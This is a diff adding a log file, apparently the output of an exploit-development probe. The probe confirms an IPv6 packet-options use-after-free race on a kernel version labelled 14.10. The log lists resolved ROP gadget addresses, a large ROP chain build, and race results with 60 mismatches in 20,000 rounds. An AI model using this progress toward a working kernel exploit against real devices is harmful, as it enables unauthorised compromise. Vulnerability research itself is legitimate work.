@@ -1,0 +1,63 @@
+=== PROBE 1338a: IPV6 PKTOPTS RACE DETECTION ===
+
+[0] install SIG_IGN for SIGSYS
+  done
+[1] fn=82CA3CB57
+  pid=283
+[2] dynlib_get_info(593)
+  593 ok=true rv=0
+  ebase=6FF98000
+  pop_rax=1878624658 pop_rdi=1879449086 pop_rsi=1878677373 pop_rdx=1882489559 pop_rcx=1878625892 store=1879223399 jmp=1878709377
+[4] socket(AF_INET6=28, SOCK_DGRAM=2, 0)
+  fd=22
+[5] PKTINFO baseline
+  set ok=true rv=0
+  get ok=true rv=0 addr4=0x41424344 (expect 0x41424344)
+[6] socketpair
+  ok=true read_fd=23 write_fd=24
+[7] mmap block=3110D0000 size=0x200000
+  building chain (20000 rounds)...
+  chain: 220011 entries, 1760088 bytes (limit=2080768)
+[8] [BEFORE] thr_create (parked in read)
+  spawn ok=true rv=0 tid=101332
+
+[9] [BEFORE] RACE: releasing child
+  write(sp_wr) ok=true rv=1
+  [progress] 5000/20000 set_ok=5000 set_fail=0 mismatch=60
+  [progress] 10000/20000 set_ok=10000 set_fail=0 mismatch=60
+  [progress] 15000/20000 set_ok=15000 set_fail=0 mismatch=60
+  [progress] 20000/20000 set_ok=20000 set_fail=0 mismatch=60
+[10] child_done marker=0xC0FFEE (expect 0xC0FFEE)
+
+=== RESULTS ===
+  parent rounds=20000  set_ok=20000  set_fail=0  get_ok=20000
+  MISMATCHES=60
+  first at round 1
+  round 1: addr4=0x00000000
+  round 2: addr4=0x00000000
+  round 3: addr4=0x00000000
+  round 4: addr4=0x00000000
+  round 5: addr4=0x00000000
+  round 6: addr4=0x00000000
+  round 7: addr4=0x00000000
+  round 8: addr4=0x00000000
+  round 9: addr4=0x00000000
+  round 10: addr4=0x00000000
+  round 11: addr4=0x00000000
+  round 12: addr4=0x00000000
+  round 13: addr4=0x00000000
+  round 14: addr4=0x00000000
+  round 15: addr4=0x00000000
+  round 16: addr4=0x00000000
+  round 17: addr4=0x00000000
+  round 18: addr4=0x00000000
+  round 19: addr4=0x00000000
+  round 20: addr4=0x00000000
+  pid=283
+
+*** RACE WINDOW CONFIRMED ON 14.10 ***
+*** 60 mismatches in 20000 rounds = 0.3% ***
+*** IPv6 pktopts UAF race is reachable ***
+
+[12] cleanup
+=== 1338a COMPLETE ===
